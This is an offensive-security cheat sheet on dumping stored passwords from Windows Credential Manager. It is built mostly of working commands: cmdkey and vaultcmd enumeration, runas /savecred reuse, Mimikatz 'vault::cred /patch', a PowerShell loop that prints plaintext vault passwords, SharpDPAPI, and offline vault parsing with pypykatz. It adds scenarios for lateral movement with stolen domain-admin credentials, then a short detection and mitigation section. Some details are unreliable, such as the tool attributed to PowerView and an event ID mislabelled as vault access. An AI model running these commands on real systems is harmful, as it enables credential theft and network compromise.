# <span style="color:rgb(255, 192, 0)">Windows Credential Manager</span>

Windows Credential Manager (Vault) stores credentials for:
- Windows login (RDP, runas, scheduled tasks)
- Web credentials (IE, Edge, Office 365)
- Generic credentials (VPN, Wi-Fi, mapped drives)
- Domain credentials (cached logons)

---

## <span style="color:rgb(255, 0, 0)">1. Enumeration with Built-in Tools</span>

### cmdkey — List Stored Credentials
```cmd
cmdkey /list
```
Lists all stored credentials and targets.

Sample output:
```
Currently stored credentials:
    Target: Domain:interactive=target=CONTOSO\Administrator
    Type: Domain Password
    User: CONTOSO\Administrator
    
    Target: LegacyGeneric:target=TERMSRV/WS001
    Type: Generic
    User: CONTOSO\admin
```

### cmdkey — Add/Delete Credentials
```cmd
# Add credential
cmdkey /add:TERMSRV/WS001 /user:CONTOSO\admin /pass:Summer2024!

# Delete credential
cmdkey /delete:TERMSRV/WS001
```

---

## <span style="color:rgb(0, 176, 240)">2. runas /savecred</span>

The `/savecred` flag saves the user's password in Credential Manager, allowing re-use without re-entering:

```cmd
# First execution — prompts for password and saves it
runas /user:CONTOSO\admin /savecred "cmd.exe"

# Subsequent executions — no password prompt
runas /user:CONTOSO\admin /savecred "cmd.exe"
```

### Attack Use
```powershell
# Try common targets where /savecred might be used:
runas /user:CONTOSO\admin /savecred "powershell.exe -c whoami"
runas /user:CONTOSO\backupadmin /savecred "cmd.exe"
```

### Abuse with PowerView
```powershell
# Find all saved credentials on the machine
Get-CredentialManager
```

---

## <span style="color:rgb(146, 208, 80)">3. Extracting Credentials with Mimikatz</span>

### vault::cred
```mimikatz
# List credential vaults
vault::list

# Dump all credentials from vault
vault::cred /patch

# Dump with specific vault GUID
vault::cred /patch /guid:{GUID}
```

### vault::lv (List Vaults)
```mimikatz
vault::lv
```
Lists all vaults and their contents without extracting plaintext.

---

## <span style="color:rgb(112, 48, 160)">4. PowerShell Extraction</span>

### Using Windows APIs
```powershell
# Requires: Windows.Security.Credentials.PasswordVault
Add-Type -AssemblyName System.Runtime.WindowsRuntime
$vault = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new()
$vault.RetrieveAll() | ForEach-Object {
    $_.RetrievePassword()
    [PSCustomObject]@{
        Resource = $_.Resource
        UserName = $_.UserName
        Password = $_.Password
    }
}
```

### Using CredentialManager Module
```powershell
# Install module
Install-Module -Name CredentialManager -Force

# List all stored credentials
Get-StoredCredential | Format-Table Target, UserName, Password

# Get specific credential
Get-StoredCredential -Target "TERMSRV/WS001"
```

### Using VaultCmd (Windows 8/Server 2012+)
```cmd
# List vaults
vaultcmd /listvaults

# List credentials in a vault
vaultcmd /listcreds:"Windows Credentials" /all

# List all credentials summary
vaultcmd /listschema
```

---

## <span style="color:rgb(0, 32, 96)">5. RDP Saved Credentials</span>

RDP credentials are a primary target in the Credential Manager.

### List RDP Credentials
```cmd
cmdkey /list | findstr "TERMSRV"
```

### Extract RDP Passwords
```mimikatz
vault::cred /patch

# Look for entries with Target starting with TERMSRV
```

### Using SharpDPAPI
```powershell
# GhostPack SharpDPAPI
SharpDPAPI.exe credmgr

# Dump all vault credentials
SharpDPAPI.exe vaults
```

---

## <span style="color:rgb(94, 18, 18)">6. Offline Vault Extraction</span>

### Vault Files Location
```
Windows Vault:    %APPDATA%\Microsoft\Vault\
                 %LOCALAPPDATA%\Microsoft\Vault\
                    
Credential Files: *.vcrd (Credential files)
                  *.vpol (Vault policy)
```

### Offline Decryption
```bash
# Copy vault files
copy "%APPDATA%\Microsoft\Vault\*" C:\temp\vault\
```

### Parse with pypykatz
```bash
pypykatz vault creds C:\temp\vault\
```

### Parse with SharpDPAPI (Offline)
```powershell
SharpDPAPI.exe vaults /vaultdir:C:\temp\vault\
```

---

## <span style="color:rgb(255, 255, 0)">7. Common Targets & Use Cases</span>

| Target Prefix | Type | Use |
|--------------|------|-----|
| `TERMSRV/*` | RDP | Remote Desktop connections |
| `LegacyGeneric:target=*` | Generic | VPN, WiFi, apps |
| `Domain:interactive*` | Domain | Saved domain logons |
| `MicrosoftAccount:user=*` | MSA | Microsoft account |
| `WindowsLive:*` | Live ID | Outlook, OneDrive |

### Attack Scenarios

**Scenario 1: RDP Jump Box**
```
1. User connects via RDP to jump box and checks "Remember credentials"
2. Attacker finds the jump box → cmdkey /list shows TERMSRV/DC01
3. vault::cred /patch extracts domain admin password
4. Lateral movement with saved DA credentials
```

**Scenario 2: Scheduled Task Credentials**
```
1. Admin sets up scheduled task with /savecred or stored credential
2. Attacker extracts the credential from vault
3. Uses it for persistence or privilege escalation
```

**Scenario 3: WebDAV / Mapped Drives**
```
1. Domain user maps drive with saved credentials
2. Attacker extracts generic credential
3. Gains access to file shares with saved user's permissions
```

---

## <span style="color:rgb(0, 176, 240)">8. Detection</span>

| Activity | Event ID | Description |
|----------|----------|-------------|
| `cmdkey /list` | 4688 | Process creation |
| `vaultcmd` usage | 4688 | VaultCmd.exe execution |
| Credential read | 5379 | Credential Manager read |
| Vault access | 4698 | Scheduled task with stored creds |

### Detection Queries
```powershell
# Check for vault reading tools
Get-Process -Name vaultcmd, cmdkey -ErrorAction SilentlyContinue
```

```
# Splunk/SIEM: Credential Manager access from non-interactive processes
index=windows EventCode=5379
ProcessName!="explorer.exe"
ProcessName!="svchost.exe"
```

### Mitigations

| Control | Effect |
|---------|--------|
| Disable Credential Manager | GPO: "Remove access to Credential Manager" |
| Network+ADMIN+Interactive | Do not save admin credentials on workstations |
| Restricted Admin mode | `mstsc /restrictedadmin` disables cred delegation |
| LAPS | Reduces need for local admin passwords |
| Remove /savecred | Audit scheduled tasks for saved credentials |
| WDAC/AppLocker | Block SharpDPAPI, vaultcmd abuse from non-admins |
| Credential Guard | Protects domain credentials in LSASS |
